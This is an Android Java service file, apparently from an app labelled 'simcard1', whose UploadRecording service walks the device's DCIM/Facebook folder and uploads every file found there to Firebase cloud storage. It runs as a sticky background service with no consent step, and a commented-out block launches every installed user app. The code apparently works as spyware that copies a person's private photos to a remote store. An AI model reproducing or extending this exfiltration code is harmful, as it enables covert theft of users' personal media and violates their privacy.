package com.example.kalya.simcard1;

import android.app.ProgressDialog;
import android.app.Service;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Environment;
import android.os.IBinder;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.widget.Toast;

import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.OnProgressListener;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.File;
import java.util.List;

public class UploadRecording extends Service{
    StorageReference mStorageRef;
    FirebaseStorage storage = FirebaseStorage.getInstance();
    String names[];
    String root = Environment.getExternalStorageDirectory().getAbsolutePath();
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

/*
        List<PackageInfo> packList = getPackageManager().getInstalledPackages(0);
        for (int i=0; i < packList.size(); i++)
        {
            PackageInfo packInfo = packList.get(i);
            if (  (packInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0)
            {

                String ap =  packInfo.packageName;
                //String appName = packInfo.applicationInfo.loadLabel(getPackageManager()).toString();
                Intent in = getPackageManager().getLaunchIntentForPackage(ap);
                    // We found the activity now start the activity
                    in.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(in);
                Toast.makeText(this,ap,Toast.LENGTH_LONG).show();
            }
        }*/

        Uri ura;
        mStorageRef = FirebaseStorage.getInstance().getReference();
        File file = new File(root+"/DCIM/Facebook/");
        ura = Uri.fromFile(file);
        File[] files = file.listFiles();
        for (int i = 0; i < files.length; i++)
        {
            File path = new File(file + "/"+files[i].getName());
            StorageReference riversRef = mStorageRef.child(files[i].getName());
            Toast.makeText(this,path.toString(),Toast.LENGTH_LONG).show();
            ura = Uri.fromFile(path);
            riversRef.putFile(ura).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                @Override
                public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
               Toast.makeText(getApplicationContext(),"uploaded succuss",Toast.LENGTH_LONG).show();
                }
            });

        }
        return START_STICKY;
    }
}
